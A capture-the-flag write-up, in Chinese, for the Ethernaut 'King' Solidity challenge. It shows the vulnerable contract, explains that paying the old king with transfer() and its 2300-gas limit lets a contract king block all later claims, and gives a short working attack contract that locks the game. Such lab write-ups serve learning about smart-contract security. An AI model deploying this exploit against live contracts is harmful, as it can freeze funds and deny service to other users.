#   Level 9 King
實例地址：`0x5526fc65B5F5b2269171E8d58A609788c4C955Eb`

##  題目說明
下面的合約是一個很簡單的遊戲：任何發送了高於目前獎品 ether 數量的人將成為新的國王。在這個遊戲中，新的獎拼會支付給被推翻的國王，在這過程中就可以賺到一點 ether。看起來是不是有點像龐氏騙局 (*´∀`)~♥ 這麽好玩的遊戲，你的目標就是攻破它。 當你提交實例給關卡時，關卡會重新申明他的王位所有權。如果要通過這一關，你必須要阻止它重獲王位才行 (ﾒﾟДﾟ)ﾒ

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

##  POC
該合約的問題出現在 `receive()` 函式中，因為它使用 `transfer()` 將 ETH 轉給前一位 king。然而，`transfer()` 內建 2300 gas 限制，當 king 是合約且其 `receive()` 函式執行超過 2300 gas 時，交易將因 Gas 耗盡 (Out of Gas) 而失敗，導致 king 無法變更，進而鎖死遊戲。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address payable public target;

    constructor(address payable _target) payable{
        target = _target;
        target.call{value:msg.value}("");
    }

    
    receive() external payable{
        target.call{value:msg.value}("");
    }
}
```